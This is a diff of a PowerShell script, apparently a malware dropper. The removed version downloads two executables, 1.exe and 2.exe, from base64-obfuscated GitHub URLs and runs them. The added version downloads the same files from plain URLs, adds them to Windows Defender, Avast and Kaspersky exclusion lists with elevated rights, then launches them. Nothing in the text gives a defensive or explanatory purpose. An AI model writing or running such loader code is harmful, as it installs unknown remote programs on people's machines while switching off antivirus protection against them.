@@ -1,10 +1,38 @@
-$u1 = [System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2NzMmNjL3MvcmF3L21haW4vMS5leGU=");
-$u2 = [System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2NzMmNjL3MvcmF3L21haW4vMi5leGU=");
-$o1 = "C:\1.exe";
-$o2 = "C:\2.exe";
+function Add-To-WindowsDefender-Exclusion {
+    param (
+        [string]$filePath
+    )
+    Add-MpPreference -ExclusionPath $filePath
+}
 
-Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString($u1)) -OutFile $o1;
-Start-Process -FilePath $o1;
+function Add-To-Avast-Exclusion {
+    param (
+        [string]$filePath
+    )
+    Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
+}
 
-Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString($u2)) -OutFile $o2;
-Start-Process -FilePath $o2;
+function Add-To-Kaspersky-Exclusion {
+    param (
+        [string]$filePath
+    )
+    Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
+}
+
+$file1 = "C:\1.exe"
+$file2 = "C:\2.exe"
+
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
+
+Add-To-WindowsDefender-Exclusion -filePath $file1
+Add-To-WindowsDefender-Exclusion -filePath $file2
+
+Add-To-Avast-Exclusion -filePath $file1
+Add-To-Avast-Exclusion -filePath $file2
+
+Add-To-Kaspersky-Exclusion -filePath $file1
+Add-To-Kaspersky-Exclusion -filePath $file2
+
+Start-Process -FilePath $file1
+Start-Process -FilePath $file2
